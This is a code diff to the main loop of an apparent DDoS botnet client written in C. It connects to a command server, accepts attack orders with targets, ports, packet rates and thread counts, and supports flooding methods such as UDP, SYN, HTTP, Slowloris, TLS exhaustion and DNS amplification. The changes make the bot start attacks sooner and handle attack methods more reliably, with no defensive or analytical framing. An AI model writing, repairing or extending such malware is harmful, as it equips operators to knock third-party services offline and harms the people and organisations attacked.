@@ -10,7 +10,7 @@ char g_bot_uuid[64] = {0};
 char g_cur_task_id[64] = {0};
 
 /* Must match GitHub release tag style for auto-update compare */
-#define BOT_VERSION_TAG "v4.0.20"
+#define BOT_VERSION_TAG "v4.0.22"
 
 static void sig_handler(int sig) { (void)sig; g_shutdown = 1; }
 
@@ -89,11 +89,15 @@ int main(int argc, char *argv[])
         fclose(stdin); fclose(stdout); fclose(stderr);
     }
 
-    /* Max priority + lock all memory (foreground & daemon both) */
     (void)nice(-20);
-    mlockall(MCL_CURRENT | MCL_FUTURE);
-    struct sched_param sp = { .sched_priority = 99 };
-    sched_setscheduler(0, SCHED_FIFO, &sp);
+    if (mlockall(MCL_CURRENT | MCL_FUTURE) != 0) {
+        /* Non-fatal: continue without locked pages */
+    }
+    /* Prefer SCHED_FIFO only as root; cap priority so host stays responsive */
+    if (geteuid() == 0) {
+        struct sched_param sp = { .sched_priority = 50 };
+        (void)sched_setscheduler(0, SCHED_FIFO, &sp);
+    }
 
     /* Raise file descriptor limit for massive socket pools */
     struct rlimit rl = { 1048576, 1048576 };
@@ -225,7 +229,7 @@ int main(int argc, char *argv[])
         int handshaked = 0;
         int hs_sent = 0;
 
-        /* Drain server frames (connected), then send handshake, then wait for ack. */
+        /* Optional drain of server "connected" (do not block forever). */
         {
             char pre[4096];
             int pn = ws_recv(&ws, pre, sizeof(pre));
@@ -235,10 +239,6 @@ int main(int argc, char *argv[])
                 json_str(pre, "type", t0, sizeof(t0));
                 if (foreground)
                     fprintf(stderr, "[bot] pre-recv type=%s len=%d\n", t0[0] ? t0 : "?", pn);
-                if (!strcmp(t0, "connected") || !strcmp(t0, "handshake_ack") ||
-                    !strcmp(t0, "heartbeat_ack") || !strcmp(t0, "pong"))
-                    /* connected != full handshake yet */
-                    ;
             } else if (pn < 0) {
                 if (foreground) fprintf(stderr, "[bot] pre-recv hard error, reconnect\n");
                 ws_disconnect(&ws);
@@ -260,46 +260,10 @@ int main(int argc, char *argv[])
             sleep(cfg.reconnect_min);
             continue;
         }
-
-        /* Wait for handshake_ack (or treat connected+any server msg as ok after send) */
-        {
-            int got_ack = 0;
-            for (int i = 0; i < 10 && !got_ack && !g_shutdown; i++) {
-                char abuf[4096];
-                int an = ws_recv(&ws, abuf, sizeof(abuf));
-                if (an > 0) {
-                    last_recv = time(NULL);
-                    char t1[64] = {0};
-                    json_str(abuf, "type", t1, sizeof(t1));
-                    if (foreground)
-                        fprintf(stderr, "[bot] post-hs recv type=%s\n", t1[0] ? t1 : "?");
-                    if (!strcmp(t1, "handshake_ack") || !strcmp(t1, "connected") ||
-                        !strcmp(t1, "heartbeat_ack") || !strcmp(t1, "pong")) {
-                        handshaked = 1;
-                        got_ack = 1;
-                        if (!strcmp(t1, "handshake_ack")) {
-                            int pps = json_int(abuf, "max_pps");
-                            int th = json_int(abuf, "max_threads");
-                            if (pps > 0) cfg.default_pps = (unsigned)pps;
-                            if (th > 0) cfg.default_threads = (unsigned)th;
-                        }
-                    } else if (!strcmp(t1, "error")) {
-                        if (foreground) fprintf(stderr, "[bot] server error: %s\n", abuf);
-                    }
-                } else if (an < 0) {
-                    if (foreground) fprintf(stderr, "[bot] post-hs hard error\n");
-                    break;
-                }
-            }
-            if (!got_ack) {
-                if (foreground) fprintf(stderr, "[bot] no handshake_ack, reconnect\n");
-                ws_disconnect(&ws);
-                pthread_mutex_destroy(&ws.io);
-                sleep(cfg.reconnect_min);
-                continue;
-            }
-            if (foreground) fprintf(stderr, "[bot] session ready\n");
-        }
+        /* Session is live after HS send. Do NOT wait only for handshake_ack —
+         * admin may push config_update/attack before ack (server race). */
+        handshaked = 1;
+        if (foreground) fprintf(stderr, "[bot] session ready (main loop)\n");
 
         while (!g_shutdown)
         {
@@ -322,7 +286,7 @@ int main(int argc, char *argv[])
             }
 
             /* Attack stats at most once per heartbeat interval */
-            if (g_attack_active && g_cur_task_id[0] && now - last_stats >= cfg.heartbeat_int)
+            if (is_attack_active() && g_cur_task_id[0] && now - last_stats >= cfg.heartbeat_int)
             {
                 last_stats = now;
                 char stats[512];
@@ -374,9 +338,8 @@ int main(int argc, char *argv[])
                 handshaked = 1;
             }
             else if (!strcmp(type, "attack")) {
-                /* Stop previous attack before starting new one */
-                if (g_attack_active) {
-                    g_attack_stop = 1;
+                if (is_attack_active()) {
+                    request_attack_stop();
                     usleep(200000);
                 }
                 memset(&atk, 0, sizeof(atk));
@@ -395,8 +358,31 @@ int main(int argc, char *argv[])
                 if (!atk.max_pps) atk.max_pps = cfg.default_pps;
                 if (!atk.max_threads) atk.max_threads = cfg.default_threads;
                 if (!atk.method[0]) strcpy(atk.method, "UDP");
+                /* Normalize aliases; reject unknown methods (no silent MEGA) */
+                {
+                    char *m = atk.method;
+                    for (char *p = m; *p; p++)
+                        if (*p >= 'a' && *p <= 'z') *p -= 32;
+                    if (!strcmp(m, "TCP") || !strcmp(m, "ACK")) strcpy(m, "SYN");
+                    else if (!strcmp(m, "HTTPS")) strcpy(m, "HTTP");
+                    else if (!strcmp(m, "SLOW")) strcpy(m, "SLOWLORIS");
+                    else if (!strcmp(m, "TLS") || !strcmp(m, "SSL")) strcpy(m, "TLS_EXHAUST");
+                    else if (!strcmp(m, "DNS")) strcpy(m, "DNS_AMP");
+                    if (strcmp(m, "UDP") && strcmp(m, "MEGA") && strcmp(m, "SYN") &&
+                        strcmp(m, "HTTP") && strcmp(m, "SLOWLORIS") &&
+                        strcmp(m, "TLS_EXHAUST") && strcmp(m, "DNS_AMP")) {
+                        if (foreground)
+                            fprintf(stderr, "[bot] ignore unknown method '%s'\n", m);
+                        continue;
+                    }
+                    if (!strcmp(m, "MEGA")) atk.mega_mode = 1;
+                }
                 if (atk.duration_secs <= 0) atk.duration_secs = 60;
                 if (atk.port <= 0) atk.port = 80;
+                if (!atk.target[0]) {
+                    if (foreground) fprintf(stderr, "[bot] attack missing target\n");
+                    continue;
+                }
 
                 memset(g_cur_task_id, 0, sizeof(g_cur_task_id));
                 json_str(buf, "task_id", g_cur_task_id, sizeof(g_cur_task_id));
@@ -421,14 +407,14 @@ int main(int argc, char *argv[])
             }
             else if (!strcmp(type, "stop")) {
                 if (foreground) fprintf(stderr, "[bot] STOP received\n");
-                g_attack_stop = 1;
+                request_attack_stop();
             }
             else if (!strcmp(type, "ban")) {
                 g_shutdown = 1;
                 break;
             }
             else if (!strcmp(type, "standby")) {
-                g_attack_stop = 1;
+                request_attack_stop();
             }
             (void)handshaked;
         }
